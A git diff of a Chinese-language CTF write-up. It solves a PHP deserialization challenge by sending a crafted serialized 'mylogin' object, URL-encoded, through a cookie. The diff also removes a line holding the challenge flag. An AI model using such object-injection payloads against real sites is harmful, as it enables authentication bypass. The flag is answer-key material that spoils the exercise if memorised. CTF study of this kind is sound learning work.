@@ -21,7 +21,6 @@ tags:
 打开网页发现和第二题一样：
 
 ```php
-<?php
 highlight_file(__FILE__);
 error_reporting(0);
 include("flag.php");
@@ -45,7 +44,6 @@ $a = unserialize($_COOKIE['param']);
 if ($a->login()) {
     echo $flag;
 }
-?> aicx{level3_is_s0_easy_right?-adbb8b3b8552}
 ```
 
 思路参考第二题，只是把GET换成了COOKIE，payload依然是：
@@ -56,7 +54,7 @@ O:7:"mylogin":2:{s:4:"user";s:8:"daydream";s:4:"pass";s:2:"ok";}
 
 但是payload中`"`和`;`会破坏Cookie的结构，因此我们URL编码一下：
 
-```
+```php
 O%3A7%3A%22mylogin%22%3A2%3A%7Bs%3A4%3A%22user%22%3Bs%3A8%3A%22daydream%22%3Bs%3A4%3A%22pass%22%3Bs%3A2%3A%22ok%22%3B%7D
 ```
 
